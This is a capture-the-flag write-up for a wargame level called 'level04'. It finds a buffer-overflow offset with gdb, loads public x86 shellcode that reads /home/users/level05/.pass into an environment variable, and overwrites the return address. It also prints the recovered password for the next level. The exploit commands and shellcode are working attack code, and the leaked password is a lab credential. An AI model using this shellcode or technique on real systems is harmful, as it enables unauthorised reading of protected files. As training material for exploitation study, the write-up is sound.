# level04

Get offset with [a generated pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
```sh
$> gdb -q level04
(gdb) set follow-fork-mode child
(gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
[...]
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3344]
0x41326641 in ?? ()
```
*We get an offset of `156` bytes.*


We then have to create a "custom" shellcode since we cannot just use the ususal `exec()`.  
After some research, we found a working one [here](https://shell-storm.org/shellcode/files/shellcode-73.php)
```sh
$> export SHELLCODE=$(python -c 'print("\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")')
```

Get shellcode's address directly:
```sh
$> (echo "b main"; echo "r"; echo 'x/32s *((char **)environ)') | gdb -q level04 | grep "SHELLCODE" | cut -d " " -f 2 | cut -d ":" -f 1
0xffffd81f
```

We add ~30 bytes to that address to get the address of the shellcode. (`0xffffd81f -> 0xffffd83f`)

We then apply our payload
```sh
$> python -c "print 156 * 'a' + '\xff\xff\xd8\x3f'[::-1]" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```
